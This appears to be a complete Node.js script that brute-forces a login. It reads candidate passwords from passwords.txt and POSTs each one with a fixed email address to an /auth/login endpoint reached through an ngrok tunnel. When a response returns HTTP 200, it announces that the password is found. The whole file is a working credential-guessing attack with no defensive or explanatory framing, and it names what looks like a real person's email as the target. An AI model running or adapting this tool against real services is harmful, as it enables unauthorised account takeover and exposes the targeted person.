const https = require('https');
const readline = require('readline');
const fs = require('fs');

const url = '49f03d4c8836.ngrok.io';
const email = "piotrnowak@interia.pl";
const file = readline.createInterface({
    input: fs.createReadStream('passwords.txt'),
    output: process.stdout,
    terminal: false
});

var options = {
  hostname: url,
  path: '/auth/login',
  method: 'POST',
  headers: {
        'Accept': 'application/json',
       'Content-Type': 'application/json'
     }
};

file.on('line', (line) => {
    var data = { email, password: line };
    var postData = JSON.stringify(data);

    var req = https.request(options, (res) => {
		console.log(`Code: ${res.statusCode} \t Password: ${data.password}`);
        if (res.statusCode == 200) {
            console.log("========== PASSWORD FOUND ==========");
            console.log(`The password is: ${data.password}`);
            process.exit();
        }
    });
    req.write(postData);
    req.end();
});
